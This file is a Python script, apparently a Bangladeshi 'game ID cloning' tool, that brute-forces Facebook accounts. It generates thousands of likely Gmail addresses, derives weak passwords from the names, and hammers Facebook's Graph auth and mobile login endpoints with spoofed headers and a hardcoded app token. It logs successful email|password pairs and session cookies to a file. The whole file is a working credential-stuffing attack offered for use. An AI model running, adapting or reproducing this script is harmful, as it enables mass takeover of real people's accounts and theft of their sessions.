
#!/usr/bin/python3
import os, random,time,re,uuid,sys,json
try:
    import rich, requests
except:
    os.system("pip install requests rich")
    import rich, requests

from rich import print 
from rich.panel import Panel 
from rich.tree import Tree
from concurrent.futures import ThreadPoolExecutor as ThreadPool


ugen=[]
for x in range(1000):
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    


emad=[]
os.system("https://t.me/TeamElite_Channel")
def mail(emad, limit):
    while True:
        Mail=['Salam','Fahim','Tarek','Khursed','Salman','Siraj','Sajjad','Jubayer','Tasin','Emran','Emon','Himal','Sabbir','Sojib','Ridoy','Abir','Mahadi','Asif','Sani','Kousik','Arnob','Sami','Ariyan','Tushar','Naim']
        female=["Zara","Sadiya","Jannat","Sumaiya","Bristi","Misti","Sumi","Riya","Sanjida","Mahi","Orpa","Orpita","Tisha","Taniya","Tonni","Eva","Mim","Shima","Priya","Tanima","Mariya","Pinki"]
        subDomain1m=["gamer","ff","fflover","yt","official","boss","gaming","Gaming","Gamer","FF","FFlover","freefirelover","YT","999","king","streamer","ffking","Khan","Ahamed","Chowdhury","Roy","Talukdahar","Haque","Shaikh","Vai","Hossain","Hasan","Islam","xxx"]
        
        subDomain2m=["pro","noob","hacker","Itz","Pro","Noob"]
        subDomain3m=["Abir","Jisan","Rabbi","Surjo","Niloy","Joy","Sabbir","Siam","Rahul","Bisal","Naim","Saim","Orko"]
        subDomain4m=["Khan","Ahamed","Chowdhury","Roy","Talukdahar","Haque","Shaikh","Vai","Hossain","Hasan","Islam"]
        subDomain1f=["Queen","queen","gaming","streamer","FF","ff","yt","YT","ffgirl","ffqueen","freefirelover","ffyt","gamer","islam","Jahan","Moni","Chowdhury","Khan","Roy","Ahamed"]
        subDomain2f=["Pro","pro","noobre"]
        subDomain3f=["Mahi","Samiya","Sadiya","Sumi","Sultana","Nusrat","Fariya","Mim","Tanisa","Sumaiya","Sathi","Rimi","Pori","Priya"]
        subDomain4f=["Islam","Jahan","Moni","Chowdhury","Khan","Roy","Ahamed"]
        
        ma=random.choice(Mail)
        ma1=random.choice(subDomain1m)
        ma0=random.choice(subDomain2m)
        em=ma+ma1+str(random.choice(range(999)))+"@gmail.com"
        if em in emad:
            pass
        else:
            emad.append(em+"|"+ma+" "+ma1)
        
        ma=random.choice(Mail)
        ma1=random.choice(subDomain1m)
        ma0=random.choice(subDomain2m)
        emx=ma+ma1+str(random.choice(range(9999)))+"@gmail.com"
        if emx in emad:
            pass
        else:
             emad.append(emx+"|"+ma+" "+ma1)
        
        ma=random.choice(Mail)
        ma1=random.choice(subDomain1m)
        ma0=random.choice(subDomain2m)
        em1=ma0+ma+ma1+str(random.choice(range(999)))+"@gmail.com"
        if em1 in emad:
            pass
        else:
            emad.append(em1+"|"+ma+" "+ma1)
        fa1=random.choice(female)
        fa2=random.choice(subDomain1f)
        fae=fa1+fa2+str(random.choice(range(999)))+"@gmail.com"
        if fae in emad:
            pass
        else:
            emad.append(fae+"|"+fa1+" "+fa2)
        fa1=random.choice(female)
        fa2=random.choice(subDomain1f)
        fa3=random.choice(subDomain2f)
        fae2=fa3+fa1+fa2+str(random.choice(range(999)))+"@gmail.com"
        if fae2 in emad:
            pass
        else:
            emad.append(fae2+"|"+fa1+" "+fa2)
        
        max=random.choice(Mail)
        max1=random.choice(subDomain4m)
        
        Mmail=f"{max}{max1}{random.choice(range(1000))}@gmail.com"
        if Mmail in emad:
            pass
        else:
            emad.append(Mmail+"|"+max+" "+max1)
        
        
        
        Sex=random.choice(female)
        Sex2=random.choice(subDomain4f)
        
        Fmail=f"{Sex}{Sex2}{random.choice(range(1000))}@gmail.com"
        if Fmail in emad:
            pass
        else:
            emad.append(Fmail+"|"+Sex+" "+Sex2)
        
        
        
        
        
        
        
        
        
        
        
        if len(emad) > limit:
            break
        else:
            continue
    
oks=[]
done=0


logo=""" [dim white]   ____            _____        
  / __/___[red]___ ___[/red] / __(_)___[red]___[/red] 
 / _// __[red]/ -_) -_)[/red] _// / __[red]/ -_)[/red]
/_/ /_/  [red]\__/\__/[/red]_/ /_/_/ [red] \__/[/red] V2
"""
                                         
meth=Tree("[reverse white][red]Mathod[/red][/reverse white]\n")
meth.add("[bold green1]A").add("[green1]Graph")
meth.add("[bold bright_magenta]B").add("[bright_magenta]Normal")
meth.add("Example [blue]([bold green1]A[blue]/[bold bright_magenta]B[blue])")

def main():
    os.system('clear')
    print(Panel.fit(logo, subtitle=">[reverse violet]BD GAME ID CLONEING TOOL[/reverse violet]<"))
    print(Panel.fit("[bold green]Developer     —>>     𝘾𝙔𝘽𝙀𝙍 𝘼𝙋𝙐𝙍𝘽𝙊"))
    print("")
    print(meth)
    print("[bold violet]—"*35)
    HERON=input("choose> ")
    if HERON in ["01","1","A","a"]:
        md="1"
    else:
        md="2"
    
    os.system('clear')
    print(Panel.fit(logo, subtitle=">[reverse violet]BD GAME ID CLONEING TOOL[/reverse violet]<"))
    print(Panel.fit("[bold green]Developer     —>>     𝘾𝙔𝘽𝙀𝙍 𝘼𝙋𝙐𝙍𝘽𝙊"))
    print('')
    print("[reverse white]Cracking Speed[/reverse white]\n")
    print("Example [30-120] 50, 70, 90, 100")
    print("[bold violet]—"*35)
    try:
        speed=int(input("choice Speed> "))
        if speed < 130:
            pass
        else:speed=120
    except:
        main()
    
    
    
    os.system('clear')
    print(Panel.fit(logo, subtitle=">[reverse violet]BD GAME ID CLONEING TOOL[/reverse violet]<"))
    print(Panel.fit("[bold green]Developer     —>>     𝘾𝙔𝘽𝙀𝙍 𝘼𝙋𝙐𝙍𝘽𝙊"))
    
    mail(emad, 10000)
    
    print(f" Crack Limit 10000 > Method {md} ")
    print("[bold violet]—"*35)
    with ThreadPool(max_workers=speed) as pool:
        for ex in emad:
            Gmail=ex.split("|")[0].lower()
            Name=ex.split("|")[1]
            psslist=[]
            First=Name.split(" ")[0]
            Last=Name.split(" ")[1]
            
            if len(First) >2:
                psslist.append(First.lower()+"123")
                psslist.append(First+"123")
            else:pass
            if len(First) >3:
                psslist.append(First+"12")
                psslist.append(First+"@@")
                psslist.append(First+"@#")
                psslist.append(First.lower()+"12")
                psslist.append(First.lower()+"@@")
                psslist.append(First.lower()+"@#")
            else:pass
            
            if len(First) >1:
                psslist.append(First+"@123")
                psslist.append(First+"1234")
                #psslist.append(First+"12345")
                #psslist.append(First+"@1234")
                psslist.append(First.lower()+"1234")
                psslist.append(First.lower()+"12345")
                psslist.append(First.lower()+"@123")
                psslist.append(First.lower()+"@1234")
            else:pass
            
            if len(First) >4:
                psslist.append(First.lower()+"@")
                #psslist.append(First+"@")
            else:pass
            psslist.append(First.lower()+Last.lower())
            psslist.append(First.lower()+" "+Last.lower())
            psslist.append(First.lower()+Last.lower()+"123")
            psslist.append(First.lower()+Last.lower()+"1234")
            psslist.append(Last.lower()+"123")
            psslist.append(Last.lower()+"1234")
            psslist.append(First+" "+Last)
            
            if md in ["1","01"]:
                pool.submit(file_subb,Gmail,psslist)
            else:
                pool.submit(normal,Gmail,psslist)






def live_ck(uid):
    Heron=requests.get(f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}").text
    data=str(Heron)
    if "live" == data.lower():
        return "Alive"
    else:
        return "death"


def file_subb(Gmail,psslist):
    global oks,done
    sys.stdout.write(f"\r  \033[38;5;46m[𝙰𝙿𝚄𝚁𝙱𝙾-𝚇𝙳] {done}|{str(len(oks))}\r");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in psslist:
            user_agent="Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': Gmail,
            'password': ps,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_GB',
            'client_country_code': 'GB',
            'fb_api_req_friendly_name': 'authenticate'}
            head={
            'User-Agent': user_agent,
            'Accept-Encoding':  'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url1= 'https://b-graph.facebook.com/auth/login'
            q = requests.post(url1,data=data,headers=head,allow_redirects=False).json()
            if "session_key" in q:
                cid=q["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                if "Alive" == live_ck(cid):
                    print(f"\r\r[reverse white][FreeFire][/reverse white] {cid} | {ps}   \n[🎮][green1]{coki} \n")
                    open("/sdcard/FreeFire.txt","a").write(Gmail+"|"+ps+"\n")
                    oks.append(Gmail)
                    break
                else:pass
            elif "Please Confirm Email" in q:
                cid=q["uid"]
                coki=";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                if "Alive" == live_ck(cid):
                    print(f"\r\r[reverse white][FreeFire][/reverse white] {cid} | {ps}   \n[🎮][green1]{coki} \n")
                    open("/sdcard/FreeFire.txt.txt","a").write(Gmail+"|"+ps+"\n")
                    oks.append(Gmail)
                    break
                else:pass
            else:
                continue
        done+=1
    except:
        time.sleep(4)



def normal(Gmail,psslist):
    global oks,done,ugen
    sys.stdout.write(f"\r  \033[38;5;46m[𝙰𝙿𝚄𝚁𝙱𝙾-𝚇𝙳] {done}|{str(len(oks))}\r");sys.stdout.flush()
    try:
        for ps in psslist:
            session=requests.session()
            uuu=random.choice(ugen)
            free_fb = session.get('https://m.facebook.com').text
            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":Gmail,"pass":ps,"login":"Log In"}
            update= {
            "authority": 'm.facebook.com',
            "method": 'POST',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            "cache-control": 'no-cache, no-store, must-revalidate',
            "referer": 'https://m.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?1',
            "pragma": 'no-cache',
            "priority": 'u=1',
            "cross-origin-resource-policy": 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": uuu,}
            session.post(url="https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
            heron_brand=session.cookies.get_dict().keys()
            if "c_user" in heron_brand:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki.split("c_user")[:15]
                if "Alive" == live_ck(cid):
                    print(f"\r\r[reverse white][FreeFire][/reverse white] {cid} | {ps}   \n[🎮][green1]{coki} \n")
                    open("/sdcard/FreeFire.txt.txt","a").write(Gmail+"|"+ps+"\n")
                    oks.append(Gmail)
                else:pass
            else:continue
        done+=1
    except:
        time.sleep(10)
    



if __name__=="__main__":
    main()

















